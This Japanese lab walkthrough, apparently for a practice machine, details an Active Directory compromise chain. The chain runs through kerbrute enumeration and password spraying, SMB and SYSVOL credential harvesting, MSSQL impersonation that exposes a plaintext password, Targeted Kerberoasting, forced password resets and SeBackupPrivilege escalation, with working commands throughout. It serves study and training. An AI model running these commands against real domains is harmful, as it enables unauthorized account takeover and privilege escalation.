kerbruteで入手したユーザー名にパスワードブルートフォースをして有効なアカウントを発見。SMBを列挙して他ユーザーの認証情報を入手し、MSSQLにログイン。MSSQLでIMPERSONATEしてテーブルを列挙し、さらに他ユーザーの認証情報を入手。BloodHound でGenericWriteやForceChangePassword をエクスプロイトし横移動していき、SeBackupPrivilegeで権限昇格。

---

1. Port Scanをしたところ、WebサービスやMSSQLに加え、SMB、KerberosなどのActive Directory環境のポートがopenになっていることを確認

2. Webサービスから特に情報が入手できなかったため、`kerbrute`でユーザー名を列挙
```sh
kerbrute userenum --dc <DC_IP> -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

3. 見つかったユーザー名に対して、ユーザー名をパスワードとして利用してブルートフォースし、有効な認証情報を発見
```sh
kerbrute passwordspray --dc <DC_IP> -d <domain> <username wordlist> '<pw>'
```

4. SMBで列挙
```sh
smbmap -u info -p info -H hokkaido-aerospace.com
```
- NetExecではうまくいかなったが、SMBMapならうまくいった

5. SYSVOLからデフォルト認証情報と思われるパスワードを入手し、それをKerbruteで発見したユーザーに対して再度スプレーして、有効であることを確認
```sh
kerbrute passwordspray --dc <DC_IP> -d <domain> <username wordlist> '<pw>'
```

6. MSSQLにログインし、なりすまし可能なユーザーを探索し、なりすましてデータベースにアクセスした結果、新たな認証情報を入手
```sh
impacket-mssqlclient hokkaido-aerospace.com/discovery@$TargetIP -port 1433 -windows-auth
```
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'hrappdb-reader';

USE hrappdb;

SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM sysauth;
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'   
```

7. 入手した認証情報は、ほかユーザーオブジェクトに対して `GenericWrite` をもっていたため、 Targeted Kerberoast を実行（[💥AD Exploit](../Cheatsheet/🪟Windows/Active%20Directory/💥AD%20Exploit.md#Targeted%20Kerberoast)）
```sh
python3 targetedKerberoast.py -v -d '<domain>' -u '<username>' -p '<pw>'
```

8. Kerberoastして侵害したユーザーが、ほかユーザーオブジェクトに対してForceChangePassword ACE をもっていたため、パスワードを変更（[💥AD Exploit](../Cheatsheet/🪟Windows/Active%20Directory/💥AD%20Exploit.md#ForceChangePassword)）
```sh
rpcclient //<TargetIP> -U <domain>/<username>
# rpcclient $>プロンプトで
setuserinfo2 <username> 23 '<new_pw>'
```

9. パスワードを変更して侵害したユーザーが Tier 0 のユーザーであったため、RDP 接続し、PowerShell を Run as Administrator してSeBackupPrivilegeがあったため、権限昇格